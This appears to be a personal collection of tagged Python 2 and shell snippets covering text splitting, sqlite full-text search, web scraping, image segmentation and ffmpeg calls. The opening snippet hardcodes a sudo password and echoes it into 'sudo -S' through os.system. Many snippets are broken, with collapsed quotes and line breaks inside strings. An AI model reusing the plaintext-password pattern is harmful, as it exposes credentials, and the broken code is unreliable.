import os
command = "sudo -S rm /usr/local/lib/python2.7/dist-packages/skpy/conn.pyc"
password = getpass.getpass()
os.system('echo %s | %s' % (password, command))

# works
command = "rm /usr/local/lib/python2.7/dist-packages/skpy/msg.pyc"
sudoPassword = 'ThinkPadT$#'
p = os.system('echo %s|sudo -S %s' % (sudoPassword, command))

----------
sudo in cell use sudo in jupyter use sudo cell 
using sudo cell 


----
id:113

s = "$hahahaha$hahahaha hello"
" ".join(s.rsplit("$",1)[1:])
#returns:
'hahahaha hello'
____________________________
s = "MM$hahahaha!$hahahaha hello"
(re.split("[$@*&?]",s)[-3])
#returns:
'MM'
_____________________________
s = "$hahahaha$hahahaha hello"
(re.split("[$]",s)[-1])
#returns:
'hahahaha hello'
_____________________________
s = "$hahah*aha$hahahaha hello"
(re.split("[*]",s)[-1])
#returns:
'aha$hahahaha hello'
_____________________________
import re
text = "$hahahaha$hahahaha hello"
print text.replace(re.findall(r'\$(.*?)\$', text)[0],'').replace('$','')
#returns:
'hello'
_____________________________
import re
#text = "$hahahaha$hahahaha hello"
text = "https://$rationalwiki.org/wiki/Li$st_of_conspiracy_theories"
print text.replace(re.findall(r'\$(.*?)\$', text)[0],'').replace('$','')
#returns:
https://st_of_conspiracy_theories
_____________________________
import re
#text = "$hahahaha$hahahaha hello"
text = "https://$rationalwiki.org/wiki/Li$st_of_conspiracy_theories"
print text.replace(re.findall(r'/', text)[0],'XXX').replace('$','')
#returns
https:XXXXXXrationalwiki.orgXXXwikiXXXList_of_conspiracy_theories
using re using findall replace split rsplit lsplit findall() replace() split() rsplit() lsplit()

----
id:114

#!/usr/local/bin/python
""
Converts a date into a fraction of a year
convert year to decimals decimal
Usage: Takes two arguments month and day.
python dateTodec.py 2  22
""
from __future__ import division
import sys
import math
import sys, getopt
MonthNum = int(sys.argv[1]) 
DateI = int(sys.argv[2])

""
MonthNum = sys.argv[1]
DateI = sys.argv[2]
x=int(MonthNum)
y=int(DateI)
print x, y
#!/usr/bin/python
import sys
MonthNum = int(sys.argv[1]) 
DateI = int(sys.argv[2])
""

mn = (MonthNum-1)*30.14
r = mn+DateI-1
op = 365.25/r-365.25
print "fraction: ",r/365.25
print "
"
print "Notice the change format of print after being turned into an object"
fraction = "fraction: ",r/365.25
print fraction



----
id:115

from time import sleep
ID = [750,771,772,1000,1077,1099,1110,1277,1499,  2000, 20050, 20167]
count = 0
inc = len(ID)
while count < inc:
    for start in ID:
        sleep(.1)
        print start,
        
    del ID[-1];print "
",count
    count =count+1
count = count +1
ID = [750,771,772,1000,1077,1099,1110,1277,1499, 2000, 20050, 20167]
count = 0
inc = len(ID)
while count < inc:
    for start in ID:
        sleep(.1)
        print start,

    del ID[-inc+count]
    print "
"
    count =count+1  
---------
How to remove elements one at a time from a list.
front to rear, then rear to front 
remove items from a list elements edit a list list.
old to new and new to old front to rear, then rear to front     
    

----
id:116

strcleaned = ''.join([x for x in strtoclean if ord(x) < 128])
----------
clean code unicode clean ascii 8 byte unicode error can not decode over 128 decose encode problems
code error encode error can not decode

----
id:117

# Create Segmentation Art art Generator generate art computer generated art
from skimage import graph, data, io, segmentation, color
from skimage import future 
import skimage,os
from PIL import Image
import cv2
from matplotlib import pyplot as plt
%matplotlib inline 
path = r"/home/jack/Desktop/imagebot/greedy/"
#path = r"build/"
base_image = random.choice([
    x for x in os.listdir(path)
    if os.path.isfile(os.path.join(path, x))
    ])
filename=(path+base_image)
img = io.imread(filename)
labels1 = segmentation.slic(img, compactness=10, n_segments=400)
out1 = color.label2rgb(labels1, img, kind='avg')
g = future.graph.rag_mean_color(img, labels1, mode='similarity')
labels2 = future.graph.cut_normalized(labels1, g)
out2 = color.label2rgb(labels2, img, kind='avg')
imfile = "output/out2b01"
cv2.imwrite(imfile+".png", out2)
im = Image.open(imfile+".png")
im0 = im.resize((640,640), Image.NEAREST)
im0.save(imfile+".jpg")
im0

----------------
Create Segmentation Art art Generator generate art computer generated art
Create SegmentationArt artGenerator generateart computergeneratedart

----
id:118

import time
from matplotlib import pyplot as plt
from skimage import future
from skimage import data, segmentation, filters, color
from skimage.future import graph
from matplotlib import pyplot as plt
from skimage import io
path = r"/home/jack/Desktop/imagebot/greedy/"
#path = r"build/"
base_image = random.choice([
    x for x in os.listdir(path)
    if os.path.isfile(os.path.join(path, x))
    ])
filename=(path+base_image)
img = io.imread(filename)
labels = segmentation.slic(img, compactness=20, n_segments=400)
g = future.graph.rag_mean_color(img, labels)
def weight_boundary(graph, src, dst, n):
    default = {'weight': 0.5, 'count': 10}
    count_src = graph[src].get(n, default)['count']
    count_dst = graph[dst].get(n, default)['count']
    weight_src = graph[src].get(n, default)['weight']
    weight_dst = graph[dst].get(n, default)['weight']
    count = count_src + count_dst
    return {
        'count': count,
        'weight': (count_src * weight_src + count_dst * weight_dst)/count
    }
def merge_boundary(graph, src, dst):
    ""Call back called before merging 2 nodes.
    In this case we don't need to do any computation here."" 
    pass

labels2 = future.graph.merge_hierarchical(labels, g, thresh=0.08, rag_copy=False,
                                   in_place_merge=True,
                                   merge_func=merge_boundary,
                                   weight_func=weight_boundary)
plt.figure(figsize=(20,10))
out = color.label2rgb(labels2, img, kind='avg')
plt.imshow(out)
plt.title('        Creating Segmentation Art')

plt.savefig('tmp/seg001.png', bbox_inches='tight')
im = Image.open('tmp/seg001.png');im1 = im.resize((640,640), Image.NEAREST)
filename = time.strftime("Images/segmented%Y%m%d%H%M%S.png")
im1.save(filename)
print filename
plt.close()
im1
  

----
id:119

%%writefile sys-argv.txt

Some scripts to learn how to use sys.argv

ArgTest1.py
#!/usr/local/bin/python
import sys
a = sys.argv[1]
print a
-- tryit:
!python ArgTest1.py 456 721  
456
# result:
------------------

ArgTest2.py
#!/usr/local/bin/python
import sys
a = sys.argv[2]
print a 
#or 
print sys.argv[2]
# This will print twice to show the argv may be used directly or assigned to a variable.
---tryit:
#ArgTest2.py script executes " print a"  AND " print sys.argv[2] "
!python ArgTest2.py 456 721 34 655

#result:
721
721

------------------

ArgTest3.py
#!/usr/local/bin/python
import sys
# notice the colon after the 1. sys.argv[1:] - turns into a list
a,b,c,d,e,f = sys.argv[1:]
print sys.argv[1:]
#or identify the elements and get the unformated results
#to work correctly all 6 elements must be supplied
print a,b,c,d,e,f
-- tryit:
!python ArgTest3.py 456 721 45 2827 234 23   
 
#result:
['456', '721', '45', '2827', '234', '23']
456 721 45 2827 234 23

------------------

ArgInteger.py
#!/usr/local/bin/python
import sys
# notice the colon after the 1. sys.argv[1:]
a,b = sys.argv[1:]
print a+b

-- tryit:
!python ArgInteger.py 456 721

#result
456721

------------------

%%writefile ArgInteger03.py
#!/usr/local/bin/python
import sys
A,B,C = sys.argv[1:]
A=int(A);C=int(C)
print A+C

-- tryit:
!python ArgInteger03.py 10 2 10

#result:
20

----
id:120

%%writefile viewCSVlines.py
#!/usr/local/bin/python
""
View the head and as many lines as you wish of a CSV
the last argv 9 will print the head and 7 lines
eight lines total
Usage: 
python viewCSVlines.py co2.csv 8
""
import sys
filename = sys.argv[1]
num =  sys.argv[2]
num = int(num)
with open(filename) as myfile:
    head = [next(myfile) for x in xrange(num)]
    mystring = ''.join(head)
    print mystring
    
-------------
View lines of a CSV, View CSV head, print CSV, View and print CSV head, View file lines,  print CSV
print CSV head 
    

----
id:121

"" "
Get numpy mean of an image, np mean image mean as a float image mean as a decimal
float is the mean displayed in a value between 0 and 1 
"" "

from skimage import io
import numpy as np
image = io.imread('http://i.stack.imgur.com/Y8UeF.jpg')
print(np.mean(image))


#You might want to convert all images to float to get a value betwenn 0 and 1:

from skimage import io, img_as_float
import numpy as np

image = io.imread('publish/20170819160925.jpg')
image = img_as_float(image)
print(np.mean(image))
    

----
id:122

"" "
import sqlite3
import sys
import string
f= open("temp.html","w");f.close()
conn = sqlite3.connect('pdfsBK.db')
conn.text_factory = str
c = conn.cursor()
START = []
count=0;req=200
search = raw_input("Search String : ")
results = 0
for row in c.execute('SELECT rowid, * from pdfs'):
    if search in (row)[1]:
        Start = (row)[0]-15
        START.append(Start)
        results = results+1
        count=count+1
        if count > req:
            print "LIMIT REACHED"
            break
            
            
from time import sleep
rows = set()
roW = []
for num in START:
    count = 0
    while count < 30:
        num = str(num);num = int(num)
        Num = num + count
        rows.add(Num)
        roW.append(Num)
        count = count +1
sor = []
for row in rows:
    row = str(row)
    sor.append('' + row + '')
def order(sor):
    SOR = sorted(sor, key=int)
    SOr = str(SOR)
    SOr = SOr.replace("'", "")
    SOr = SOr.replace("[", "")
    SOr = SOr.replace("]", "")
    SOr = SOr.replace(",", "
")
    return SOr
f= open("temp.html","a")
USE = order(sor)  
USE0 = str(USE)
USE1 = USE0.split("
")
for start1 in USE1:
    
    start1 = int(start1)
    for row in c.execute('SELECT rowid, * from pdfs WHERE rowid = ?', (start1,)):
        print (row)[0],"-",(row)[1],
        text = (row)[1]
        text = str(text)+"<br />"
        #text = text.encode('latin-1').decode('utf-8')
        printable = set(string.printable)
        text = filter(lambda x: x in printable,text)
        f.write(text)
        
conn.close()    

----------
read database read pdf sort sort rows sort lines no duplicate
    

----
id:123

"" "
# Valid chars . a-z 0-9
# check a line contains specific characters special characters specific string
# check line specific characters check line for special characters check line for 
# specific string
def check(test_str):
    import re
    pattern = r'[^\.a-z0-9]'
    if re.search(pattern, test_str):
        #Character other then . a-z 0-9 was found
        print 'Invalid : %r' % (test_str,)
    else:
        #No character other then . a-z 0-9 was found
        print 'Valid   : %r' % (test_str,)

check(test_str='abcde.1')
check(test_str='abcde.1#')
check(test_str='ABCDE.12')
check(test_str='_-/>"!@#12345abcde<')

----
id:124

from requests import get
from bs4 import BeautifulSoup
import string
import os
storage = "snippetsIO.html"
f = open(storage, "w");f.close()
url ="https://snippets.readthedocs.io/en/latest/"
def buildfile(url):
    with open(storage,"a") as fU:    
        response = get(url)
        html_soup = BeautifulSoup(response.text, 'html.parser')
        type(html_soup)
        html_soup = str(html_soup)
        fU.write(html_soup)
        return html_soup
    
buildfile(url)  

---------------------
download and save a url save webpage save url beautiful soup

----
id:125

storage = "snippetsIO.html"
f = open(storage, "r").readlines()
for lines in f:
    lines = str(lines)
    lines = lines.replace("<a","XXX
<a")
    line = lines.replace("/a>","/a>
XXX")
    line = line.split("XXX")
    for line in line:
        if "<a " in line:
            line = line.replace("
","")
            print line
-----------------
separate links separate <a separate tags no beautiful soup

----
id:126

from random import randint
dd = []
DD = set()
count =0
while count < 20:
    s = randint(1,10)
    DD.add(s)
    count = count +1
for e in DD:
    dd.append(e)
print "Set DD",DD
print "List dd",dd

-----------------------
making a unique list list with no duplicate no duplicate list without repeats

----
id:127

from random import randint
dd = []
DD = set()
count =0
while count < 20:
    s = randint(1,10)
    DD.add(s)
    count = count +1
for e in DD:
    dd.append(e)
print "Set DD",DD
print "List dd",dd

-----------------------
making a unique list list with no duplicate no duplicate list without repeats
using list[] and set()

----
id:128

count = 0
while count < 40:
    count =count +1
    if count %3 == 0:
            print count
    
-------------
get odd get even get every third get three
get every _n get every n counts
    

----
id:129

import csv
from time import sleep
with open("SMSSpamCollection", "r") as f:
    reader = csv.reader(f)
    for i, line in enumerate(reader):
        sleep(.5)
        print 'line[{}] = {}'.format(i, line)
-------------------
format variables using variables enumerate example variable example format

----
id:130

import sqlite3
import feedparser
import time
import sqlite3
Dbase = 'test0.db'
conn = sqlite3.connect(Dbase)
c = conn.cursor()
c.execute('''
CREATE VIRTUAL TABLE IF NOT EXISTS merge
USING FTS3(file, keyword);
''')

Dbase = 'test1.db'
con = sqlite3.connect(Dbase)
cc = con.cursor()
cc.execute('''
CREATE VIRTUAL TABLE IF NOT EXISTS merge 
USING FTS3(file0, keyword0);
''')

Dbase = 'test2.db'
co = sqlite3.connect(Dbase)
ccc = co.cursor()
ccc.execute('''
CREATE VIRTUAL TABLE IF NOT EXISTS merge 
USING FTS3(file1, keyword1);
''')
co.commit()

file = " ""
second time - This is data for database test0.db
" ""
keyword = "SQLite inserting one database into another"
c.execute("INSERT INTO merge VALUES (?,?)", (file, keyword))
conn.commit()
for row in c.execute("select * FROM merge"):
    print row[0],row[1]
    ccc.execute("INSERT INTO merge VALUES (?,?)", (row[0],row[1]))
    co.commit()
conn.close()

file0 = " ""
SECOND ENTRY - This is data for database test1.db
" ""
keyword0 = "SQLite inserting test0.db database into test1.db"
cc.execute("INSERT INTO merge VALUES (?,?)", (file0, keyword0))
con.commit()
for row1 in cc.execute("select * FROM merge"):
    print row1[0],row1[1]
    ccc.execute("INSERT INTO merge VALUES (?,?)", (row1[0],row1[1]))
    co.commit()

con.close()
print ("--------------------------------------")
Dbase = 'test2.db'
co = sqlite3.connect(Dbase)
ccc = co.cursor()
for rowz in ccc.execute("select * FROM merge"):
    print  rowz[0],rowz[1]
    
    
--------------------
joining databases merge sqlite database merge db join db merging databases

----
id:131

c.execute('CREATE VIRTUAL TABLE IF NOT EXISTS snippet USING FTS3(encodedlistvalue, file, keywords);')

import sqlite3
import base64
conn = sqlite3.connect('snippet.db') 
c = conn.cursor()
conn.text_factory = str
file = ""

""
keywords = "delete sqlite by rowid delete id rowid ROWID"
encodedlistvalue=base64.b64encode(file)
c.execute("INSERT INTO snippet VALUES (?,?,?)", (encodedlistvalue, file, keywords))
conn.commit()
conn.close()

----
id:132

import sqlite3
import sys
conn = sqlite3.connect('/home/jack/snippet.db')
conn.text_factory = str
c = conn.cursor()
count=0;req=200
search = raw_input("Search : ")
for row in c.execute('SELECT rowid, * FROM snippet WHERE snippet MATCH ?', (search,)):    
    count=count+1
    print "ID : ",(row)[0],(row)[2]," -- KEYWORDS",(row)[3],"
"
    if count > req:
        conn.close()
        sys.exit()



import sqlite3
import base64
conn = sqlite3.connect('home/jack/snippet.db') 
c = conn.cursor()
conn.text_factory = str
file = ""

""
keywords = "delete sqlite by rowid delete id rowid ROWID"
encodedlistvalue=base64.b64encode(file)
c.execute("INSERT INTO snippet VALUES (?,?,?)", (encodedlistvalue, file, keywords))
conn.commit()
conn.close()

----
id:133

import itertools
from operator import itemgetter
students = [
    {'name': 'alex','class': 'A'},
    {'name': 'richard','class': 'A'},
    {'name': 'john','class': 'C'},
    {'name': 'harry','class': 'B'},
    {'name': 'rudolf','class': 'B'},
    {'name': 'charlie','class': 'E'},
    {'name': 'budi','class': 'C'},
    {'name': 'gabriel','class': 'B'},
    {'name': 'dessy', 'class': 'B'}
]
# Sort students data by `class` key.
Grades = sorted(students, key=itemgetter('class'))
for grade in Grades:
     print "By Grades : ",grade
Students = sorted(students, key=itemgetter('name'))
for student in Students:
     print "By Students : ",student
        

----
id:134

import collections
import operator
from collections import OrderedDict
d = {2:3, 1:89, 4:5, 3:0, 2:3, 1:49, 34:5, 13:0, 21:3, 8:49, 4:25, 23:0}
value = OrderedDict(sorted(d.items(), key=operator.itemgetter(1)))
print ("Sorted by Value: ",value)
print "
"
key = OrderedDict(sorted(d.items(), key=operator.itemgetter(0)))
print ("Sorted by Key: ",key)

----
id:135

import operator
data = {
    'Input.txt': 'Randy',
    'Code.py': 'Stan',
    'Output.txt': 'Randy',
    'Input2.txt': 'Randy',
    'Code.pyc': 'Stan',
    'keyput.txt': 'Randy',
    'NCode.pyc': 'Stan',
    'keyput2.txt': 'Randy' 
}
# The " itemgetter(1) " is by value, " itemgetter(0) " is by key.
sorted_Author = sorted(data.items(), key=operator.itemgetter(1))
sorted_Author

----
id:136

import re
class Palindrome:

    @staticmethod
    def is_palindrome(word):
        m = re.search(word, word[::-1], re.IGNORECASE)
        return bool(m)
    
word = "Deleveled"
print(Palindrome.is_palindrome(word))

----
id:137

value = "this is an automatics title maker"

# Convert to title case.
result = value.title()
print(result)


# results in "This Is An Automatics Title Maker"

----
id:138

import operator
from collections import OrderedDict
class FileOwners:
    @staticmethod
    def group_by_owners(files):
        value = OrderedDict(sorted(files.items(), key=operator.itemgetter(1)))
        f= ("Sorted by Value: ",value)
        return f
files = {'Input.txt': 'Randy','Code.py': 'Stan','Output.txt': 'Randy'}


FileOwners.group_by_owners(files)

---------------

import operator
from collections import OrderedDict
class FileOwners:
    @staticmethod
    def group_by_owners(files):
        value = OrderedDict(sorted(files.items(), key=operator.itemgetter(0)))
        f= ("Sorted by Value: ",value)
        return f
files = {'Answers.txt': 'Randy','Code.py': 'Stan','Output.txt': 'Randy', 'Before.txt': 'Randy',}

FileOwners.group_by_owners(files)

-------------
grouping dictionaries, group, by key, group by value, dictionary, dictionaries
grouping group dictionaries, group by key, group by value, dictionary,group dictionaries group

----
id:139

import subprocess
subprocess.call("sleep.sh")

A: os.system("some_command with args") 
passes the command and arguments to your system's shell. 
Multiple commands may be executed at once 
Set up pipes and input/output redirection. 
For example:
os.system("history > history.text | locate /PIL/ > pil_directory.txt") 
However, you must manually handle the escaping of characters 
such as spaces. 
http://docs.python.org/lib/os-process.html

stream = os.popen("some_command with args") 
Same thing as os.system except that it creates a file-like object
to access standard input/output for that process. 
There are 3 other variants of popen that all handle the i/o slightly differently. 
If you pass everything as a string, then your command is passed to the shell; 
if you pass them as a list then you don't need to worry about escaping anything. 
http://docs.python.org/lib/os-newstreams.html

The Popen class of the subprocess module. 
This is intended as a replacement 
for os.popen is slightly more complicated by 
virtue of being so comprehensive. 
Example:
Popen("echo Hello World", stdout=PIPE, shell=True).stdout.read() 
Instead of, print os.popen("echo Hello World").read() 

The call function from the subprocess module. 
This is basically just like the Popen class and takes all of the same arguments, 
but it simply wait until the command completes and gives you 
the return code. 
Example: 
return_code = call("echo Hello World", shell=True) 


C. pexpect, which is a python implementation of Expect. 
Example:

import pexect
child = pexpect("echo "foo")
child.expect("foo", timeout=10) # timeout in seconds
child.sendline("echo "bar")
child.expect("bar", timeout=10)
child.interact() # gives control to the user
---------------
import sh
sh.cd('/path/to/Development')
print(sh.pwd())
# => /path/to/Development
----------------
executing bash, executing shell, executing terminal commands, terminal commands, bash command 
executing bash shell, execute terminal commands, terminal, bash command 

----
id:140

var somevar = false;
var PTest = function () {
    return new Promise(function (resolve, reject) {
        if (somevar === true)
            resolve();
        else
            reject();
    });
}
var myfunc = PTest();
myfunc.then(function () {
     console.log("Promise Resolved");
}).catch(function () {
     console.log("Promise Rejected");
});

-----------
DeprecationWarning: Unhandled promise rejections are deprecated.
In the future, promise rejections that are not handled will terminate the Node.
js process with a non-zero exit code.

        

----
id:141

var somevar = false;
var PTest = function () {
    return new Promise(function (resolve, reject) {
        if (somevar === true)
            resolve();
        else
            reject();
    });
}
var myfunc = PTest();
myfunc.then(function () {
     console.log("Promise Resolved");
}).catch(function () {
     console.log("Promise Rejected");
});

-----------
DeprecationWarning: Unhandled promise rejections are deprecated.
In the future, promise rejections that are not handled will terminate the Node.
js process with a non-zero exit code.

        

----
id:142

from requests import get
from bs4 import BeautifulSoup
import string
from time import gmtime, strftime
from IPython.core.display import display, HTML
try:
    del f;del mvc;del title;del soup;del line;del DATE;del f
except:NameError
# Create a date to add under Title
DATE = strftime("%Y-%m-%d", gmtime())    
# To delete all file content while developing
f = open("nwa_NEWS_"+DATE+".html", "w");f.close()
# open to append
f = open("nwa_NEWS_"+DATE+".html", "a")
mvc = set()
url = "http://www.nwahomepage.com/news"
# Add a title to top of page
title = "<center><h1>"+url+"</h1>
</center>"
f.write(title)
# Add Date under title
f.write('<center>'+DATE+'</center>')
response = get(url)
soup = BeautifulSoup(response.text, 'html.parser')
data = soup.findAll('div',attrs={'class':'headline-wrapper'});
for txt in data:
    txt =str(txt)
    printable = set(string.printable)
    txt = filter(lambda x: x in printable,txt)
    txt = txt.split(",")
    for line in txt:
        line =line.replace("\u2026","")
        line =line.replace("[","");line =line.replace("(","")
        line = str(line)
        line =line.replace("<h4","
<h4");line =line.replace("<a","
<a")
        line =line.replace("
","");line =line.replace("32\xb0 ","-")
        line =line.replace("]","");line =line.replace("\xa0"," ")
        line =line.replace("\xa9","-");line =line.replace(")","")
        line =line.replace("f="/","f="http://www.nwahomepage.com/")
        # Display nice HTML
        display(HTML(line))        
        f.write(line)


----
id:143

line = re.sub(' +',' ',line).lstrip(' ')

----
id:144

line = re.sub('<[^>]+>', '', data)
Example:
data = "<begone> 1234 remove <this>"
line = re.sub('<[^>]+>', '', data)
print line

>>>1234 remove 

----
id:145

from IPython.core.display import display, HTML
line = " ""
<html>
<h1>SEE HTML</h1>
<p style ="border:1px solid navy;border-radius:5px;padding:6px;" >
This is a nice way to view HTML
</p>
" ""
display(HTML(line))   

----
id:146

to get fts5 extensions: 
reinstall sqlite3
https://hackernoon.com/sqlite-the-unknown-feature-edfa73a6f022
sudo add-apt-repository ppa:jonathonf/backports
sudo apt-get update && sudo apt-get install sqlite3

sqlite3 -version
3.22.0 2018-01-22 18:45:57 
0c55d179733b46d8d0ba4d88e01a25e10677046ee3da1d5b1581e86726f2171d

----
id:147

zip all files in a directory:
for i in *; do zip $i.zip $i; done

zip all files except those with a *zip extension:
#!/bin/bash
for i in $PWD/*.*; do
    if [ -z ${i##*.zip} ]; then
        # $i ends with ".zip"
        echo "already a zip file: $i"
    elif [ -f ${i}.zip ] ; then
        # there  already exists a zipped file named $i.zip
        echo "already has zipped sibling: $i"
    else
        # actually zip $i into $i.zip
        zip $i.zip $i
    fi
done

----
id:148

fi = open('addto3.txt', "r").readlines()
for line in fi:
    line = line.replace("
","")
    print line

----
id:149

usage: autopep8 [-h] [--version] [-v] [-d] [-i] [--global-config filename]
                [--ignore-local-config] [-r] [-j n] [-p n] [-a]
                [--experimental] [--exclude globs] [--list-fixes]
                [--ignore errors] [--select errors] [--max-line-length n]
                [--line-range line line]
                [files [files ...]]

Automatically formats Python code to conform to the PEP 8 style guide.

positional arguments:
  files                 files to format or '-' for standard in

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         print verbose messages; multiple -v result in more
                        verbose messages
  -d, --diff            print the diff for the fixed source
  -i, --in-place        make changes to files in place
  --global-config filename
                        path to a global pep8 config file; if this file does
                        not exist then this is ignored (default:
                        ~/.config/pep8)
  --ignore-local-config
                        don't look for and apply local config files; if not
                        passed, defaults are updated with any config files in
                        the project's root directory
  -r, --recursive       run recursively over directories; must be used with
                        --in-place or --diff
  -j n, --jobs n        number of parallel jobs; match CPU count if value is
                        less than 1
  -p n, --pep8-passes n
                        maximum number of additional pep8 passes (default:
                        infinite)
  -a, --aggressive      enable non-whitespace changes; multiple -a result in
                        more aggressive changes
  --experimental        enable experimental fixes
  --exclude globs       exclude file/directory names that match these comma-
                        separated globs
  --list-fixes          list codes for fixes; used by --ignore and --select
  --ignore errors       do not fix these errors/warnings (default: E24)
  --select errors       fix only these errors/warnings (e.g. E4,W)
  --max-line-length n   set maximum allowed line length (default: 79)
  --line-range line line, --range line line
                        only fix errors found within this inclusive range of
                        line numbers (e.g. 1 99); line numbers are indexed at
                        1
autopep8 --in-place --aggressive --aggressive firepwd2text.py
https://pypi.python.org/pypi/autopep8
autopep8 automatically formats Python code to conform to the PEP 8 style guide.
It uses the pycodestyle utility to determine what parts of the code needs to be 
formatted. autopep8 is capable of fixing most of the formatting issues that can 
be reported by pycodestyle.

----
id:150

sudo for package in $(apt-get upgrade 2>&1 | grep "warning: files list file for package '" | grep -Po "[^'
 ]+'" | grep -Po "[^']+"); sudo apt-get install --reinstall python-dev
warning: files list file for package 
repair broken packages

----
id:151

# %load CROP.py
from PIL import Image
def crop(ImagePath, coOrds, save):
    ""
    image_path: The path to the image to edit
    co-ords: A tuple of x/y coordinates (x1, y1, x2, y2)
    saved: Path to save the image
    ""
    imObj = Image.open(ImagePath)
    cropped = imObj.crop(coOrds)
    cropped.save(save)
    # Uncomment below for a pop-up viewer
    #return cropped.show()
    return cropped

EXAMPLE:
from PIL import Image
import CROP
image = '640x640/162.jpg'
filename = 'cropped162.jpg'
CROP.crop(image, (0, 100, 240, 440), filename)

img = Image.open(filename)
img    

----
id:152

import subprocess
a ="ffmpeg"
b = "-i"
c1 = "1280x720sharpen/126.jpg"
c2 = "1280x720sharpen/185.jpg"
c3 = "1280x720sharpen/128.jpg"
d= "-filter_complex"
e="color=c=black:r=60:size=1280x720:d=10[black];[0:v]format=pix_fmts=yuva420p,crop=w=2*floor(iw/2):h=2*floor(ih/2),zoompan=z='if(eq(on,1),1,zoom+0.000417)':x='0':y='ih-ih/zoom':fps=60:d=60*4:s=1280x720,crop=w=1280:h=720:x='(iw-ow)/2':y='(ih-oh)/2',fade=t=in:st=0:d=1:alpha=0,fade=t=out:st=3:d=1:alpha=1,setpts=PTS-STARTPTS[v0];[1:v]format=pix_fmts=yuva420p,crop=w=2*floor(iw/2):h=2*floor(ih/2):x='(ow-iw)/2':y='(oh-ih)/2',zoompan=z='if(eq(on,1),1,zoom+0.000417)':x='0':y='0':fps=60:d=60*4:s=1280x720,fade=t=in:st=0:d=1:alpha=1,fade=t=out:st=3:d=1:alpha=1,setpts=PTS-STARTPTS+1*3/TB[v1];[2:v]format=pix_fmts=yuva420p,crop=w=2*floor(iw/2):h=2*floor(ih/2),zoompan=z='if(eq(on,1),1,zoom+0.000417)':x='0':y='0':fps=60:d=60*4:s=1600x720,crop=w=1280:h=720:x='(iw-ow)/2':y='(ih-oh)/2',fade=t=in:st=0:d=1:alpha=1,fade=t=out:st=3:d=1:alpha=0,setpts=PTS-STARTPTS+2*3/TB[v2];[black][v0]overlay[ov0];[ov0][v1]overlay[ov1];[ov1][v2]overlay=format=yuv420"
f = "-c:v"
g = "libx264"
h = "ut3.mp4"
subprocess.call([a, b, c1, b, c2, b, c3, d, e, f, g, h])
--------------------------------
image to video jupyter notebook videos image video image2video video effects image to video effects
make video from image video make video with jupyter notebook images-videos image-video image2video 
effects-imagevideo-effects

----
id:153

f0 = open('/home/jack/Desktop/tube/NERDfirst2.html',"w");f0.close()
try:
    del line   
    del lines
    f0.close()
    f.close()
    del f
    del f0
except:
    pass
f= open("/home/jack/Desktop/tube/NERDfirst-YouTube.html", "r").readlines()
count = 0
f0 = open('/home/jack/Desktop/tube/NERDfirst2.html',"a")
f0.write("<center>")
f0.write("<style>.thumb{ min-width:50%; float:left; overflow-wrap: break-word; </style>")
for lines in f:
    count = count +1
    lines = lines.replace('<a id="thumbnail"', '//////<a id="thumbnail"')
    lines = lines.replace('jpg"></yt-img-shadow>', 'jpg"></a></div>//////')
    lines = lines.replace('<h3', '//////<div class="thumb"><h3')
    lines = lines.replace('</h3>', '</h3>//////')
    lines = lines.split("//////")
    for line in lines:
        if '<a id="thumbnail"' in line or '<h3' in line or '</h3>' in line or 'jpg"></a>' in line:
            if count >708:
                rm ='<yt-img-shadow class="style-scope ytd-thumbnail no-transition" style="background-color: transparent;" loaded="">'
                line = line.replace(rm, "")
                rm0 = '<yt-img-shadow class="style-scope ytd-thumbnail no-transition" loaded="" style="background-color: transparent;">'
                line = line.replace(rm0,"")
                rm1 = 'id="thumbnail" class="yt-simple-endpoint inline-block style-scope ytd-thumbnail" aria-hidden="true" tabindex="-1" rel="null"'
                line = line.replace(rm1,"")                
                print count,line
                f0.write(line)
-------------------------------
youtube thumbnails, youtube, YouTube, create youtube page, create links and thumbnails

----
id:154

#Generating thumbnails with the same name as the video and .jpg extension
from time import sleep
from subprocess import call
import os
for root, dirs, files in os.walk("youtube-work/"):
    for filename in files:
        vids = "youtube-work/"+filename
        filename = vids.replace("
","")
        thumb = (os.path.splitext(filename)[0])
        thumbname = "thumbnails/"+thumb[13:]+".jpg"
        # Create a 200x130 thumbnail
        call(["ffmpeg", "-y", "-i", filename, "-s", "200x130", "-f", "mjpeg", "-vframes", "1", "-ss", "5", thumbname])
        print filename
        #thumbname = "thumbnails/"+filename[13:]
        print thumbname
youtube thumbnails, youtube, YouTube, create youtube page, create links and thumbnails

----
id:155

import os
count=0
lines = []
for root, dirs, files in os.walk("youtube-work/"):
    for filename in files:
        count = count +1
        #print(count,filename)
        thumb = (os.path.splitext(filename)[0])
        thumbname = "thumbnails/"+thumb+".jpg"
        TEXT = thumb+"<br /><br />"     
        line = "<a href="youtube-work/"+filename+"">         <img src=""+thumbname+"" alt=""+thumbname+"" style='border:1px solid black;"/></a><br />"
        ent = line,TEXT
        lines.append(ent)
        #lines.append(TEXT)
        if count<10:
            #the printing will stop but the generating will continue
            print count,line
        
print "Total Count: ",count        

----
id:156

# Generate a list to use in making a web page

import os
count=0
lines = []
for root, dirs, files in os.walk("youtube-work/"):
    for filename in files:
        count = count +1
        #print(count,filename)
        thumb = (os.path.splitext(filename)[0])
        thumbname = "thumbnails/"+thumb+".jpg"
        TEXT = thumb+"<br /><br />"     
        line = "<a href="youtube-work/"+filename+"">         <img src=""+thumbname+"" alt=""+thumbname+"" style='border:1px solid black;"/></a><br />"
        ent = line,TEXT
        lines.append(ent)
        #lines.append(TEXT)
        if count<10:
            #the printing will stop but the generating will continue
            print count,line
        
print "Total Count: ",count

# USE THE LIST GENERATED TO CREATE A WEB PAGE
f=open('videos.html','a')
f.write("<center>")
for link in lines:
    text = link[0:]
    text = str(text)+"
"
    text = text.replace("')","")
    text = text.replace("('","")
    text = text.replace("', '","")
    f.write(text)
f.write("</center>")    




----
id:157

import os
import os.path
title = "Processing.list"
f= open(title,"w");f.close()
count=0
for dirpath, dirnames, filenames in os.walk("/home/jack/Desktop/Processing/Processing/"):
    filenames = [f for f in filenames if not f[0] == '.']
    dirnames[:] = [d for d in dirnames if not d[0] == '.']
    for filename in [f for f in filenames if f.endswith(".ipynb")]:
        count=count+1
        Path = os.path.join(dirpath, filename)
        with open(title, 'a') as outfile:
            path = Path+"
"
            outfile.write(path)
---------------------------------
crawl directory, walk directory, find extensions create a directory list, create list, create a file

----
id:158

span = []
numold = 0
nums = "1,6,11,23,44,58,59,65,75,77,90,99"
nums = nums.split(",")
for num in nums:
    num = int(num)
    if numold +4>num:
        print num,"less"
    else:
        print num,"equal or more"
        span.append(num)
